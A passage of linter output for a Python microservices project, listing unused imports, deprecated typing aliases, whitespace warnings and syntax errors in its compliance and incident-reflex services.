    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-compliance\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-compliance\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-compliance\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-compliance\app\models.py:2:31
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  |                               ^^^^
3 | from uuid import UUID, uuid4
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\autonomous-compliance\app\models.py:2:37
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  |                                     ^^^^^^^^
3 | from uuid import UUID, uuid4
  |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\models.py:28:14
   |
26 |     target_id: str
27 |     evaluation_result: bool
28 |     details: Dict[str, Any]
   |              ^^^^
29 |     timestamp: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\models.py:50:19
   |
48 | class AuditTrigger(BaseModel):
49 |     target_id: str
50 |     data_context: Dict[str, Any]
   |                   ^^^^
   |
help: Replace with `dict`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\autonomous-compliance\app\repository.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-compliance\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-compliance\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-compliance\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-compliance\app\repository.py:6:47
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import: `typing.Tuple`

F401 [*] `uuid.UUID` imported but unused
 --> emergent-microservices\autonomous-compliance\app\repository.py:7:18
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |                  ^^^^
8 |
9 | from .logging_config import logger
  |
help: Remove unused import: `uuid.UUID`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\repository.py:15:20
   |
13 | class Database:
14 |     def __init__(self):
15 |         self.data: Dict[str, Any] = {"rules": {}, "audits": [], "violations": []}
   |                    ^^^^
16 |         self.connected = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\repository.py:30:47
   |
28 |         self.db = database
29 |
30 |     async def get_rule(self, rule_id: str) -> Optional[ComplianceRule]:
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
31 |         return self.db.data["rules"].get(rule_id)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-compliance\app\repository.py:37:35
   |
35 |         return rule
36 |
37 |     async def list_rules(self) -> List[ComplianceRule]:
   |                                   ^^^^
38 |         return list(self.db.data["rules"].values())
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-compliance\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-compliance\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `fastapi.Query` imported but unused
  --> emergent-microservices\autonomous-compliance\app\routes.py:8:53
   |
 6 | from uuid import UUID
 7 |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
   |                                                     ^^^^^
 9 |
10 | from .logging_config import logger
   |
help: Remove unused import: `fastapi.Query`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\autonomous-compliance\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\autonomous-compliance\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\autonomous-compliance\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\autonomous-compliance\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\autonomous-compliance\app\services.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\autonomous-compliance\app\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-compliance\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-compliance\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-compliance\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\autonomous-compliance\app\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-compliance\app\services.py:6:47
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `uuid.UUID` imported but unused
 --> emergent-microservices\autonomous-compliance\app\services.py:7:18
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |                  ^^^^
8 |
9 | from .logging_config import logger
  |
help: Remove unused import: `uuid.UUID`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-compliance\app\services.py:20:67
   |
18 |         self.repository = ComplianceRepository()
19 |
20 |     async def evaluate_compliance(self, trigger: AuditTrigger) -> List[ComplianceAudit]:
   |                                                                   ^^^^
21 |         """Run all active compliance rules against a data context"""
22 |         logger.info(f"Compliance: Evaluating target {trigger.target_id}")
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\services.py:54:46
   |
53 |     def _simulate_rule_eval(
54 |         self, rule: ComplianceRule, context: Dict[str, Any]
   |                                              ^^^^
55 |     ) -> bool:
56 |         """Stub for actual rule evaluation engine"""
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-compliance\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-compliance\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-compliance\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-compliance\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\autonomous-compliance\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\autonomous-compliance\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\autonomous-compliance\setup.py:6:17
  |
4 |     name="Autonomous Compliance-as-Code Engine",
5 |     version="1.0.0",
6 |     description="Build a regulator-ready microservice fabric that:
  |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | Ingests policy (YAML/DSL)
8 | Compiles invariants
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-compliance\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="Build a regulator-ready microservice fabric that:
7 | Ingests policy (YAML/DSL)
  | ^^^^^^^
8 | Compiles invariants
9 | Evaluates runtime actions deterministically
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-compliance\setup.py:7:9
  |
5 |     version="1.0.0",
6 |     description="Build a regulator-ready microservice fabric that:
7 | Ingests policy (YAML/DSL)
  |         ^^^^^^
8 | Compiles invariants
9 | Evaluates runtime actions deterministically
  |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:8:1
   |
 6 |     description="Build a regulator-ready microservice fabric that:
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
   | ^^^^^^^^
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:8:10
   |
 6 |     description="Build a regulator-ready microservice fabric that:
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
   |          ^^^^^^^^^^
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:9:1
   |
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
   | ^^^^^^^^^
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:9:11
   |
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
   |           ^^^^^^^
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:9:19
   |
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
   |                   ^^^^^^^
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:9:27
   |
 7 | Ingests policy (YAML/DSL)
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
   |                           ^^^^^^^^^^^^^^^^^
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:10:1
   |
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   | ^^^^^^^^
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:10:10
   |
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   |          ^^^^^^
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:10:17
   |
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   |                 ^^^^^
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:10:23
   |
 8 | Compiles invariants
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
   |                       ^^^^^^
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:11:1
   |
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   | ^^^^^^^
12 | Add:
13 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:11:9
   |
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |         ^^^^
12 | Add:
13 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:11:27
   |
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |                           ^^^^^^^^^
12 | Add:
13 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:11:37
   |
 9 | Evaluates runtime actions deterministically
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
   |                                     ^^^^^^^^^^^^^
12 | Add:
13 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:12:1
   |
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   | ^^^
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\autonomous-compliance\setup.py:12:4
   |
10 | Produces signed audit trails
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
   |    ^
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-compliance\setup.py:13:1
   |
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
13 | Continuous evidence generation
   | ^^^^^^^^^^
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:13:12
   |
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
13 | Continuous evidence generation
   |            ^^^^^^^^
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:13:21
   |
11 | Exports SOC2 / ISO / NIST artifacts automatically
12 | Add:
13 | Continuous evidence generation
   |                     ^^^^^^^^^^
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:14:1
   |
12 | Add:
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
   | ^^^^^^^
15 | API to expose compliance state to customers",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:14:20
   |
12 | Add:
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
   |                    ^^^^^^^^^^
15 | API to expose compliance state to customers",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:14:31
   |
12 | Add:
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
   |                               ^^^^^^
15 | API to expose compliance state to customers",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:1
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   | ^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:5
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |     ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:8
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |        ^^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:15
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |               ^^^^^^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:26
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |                          ^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:32
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |                                ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:15:35
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |                                   ^^^^^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-compliance\setup.py:15:44
   |
13 | Continuous evidence generation
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
   |                                            ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\setup.py:16:5
   |
14 | Machine-verifiable compliance proofs
15 | API to expose compliance state to customers",
16 |     author="IAmSoThirsty",
   |     ^^^^^^
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
18 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\autonomous-compliance\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\autonomous-compliance\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\autonomous-compliance\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Autonomous Incident Reflex System"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
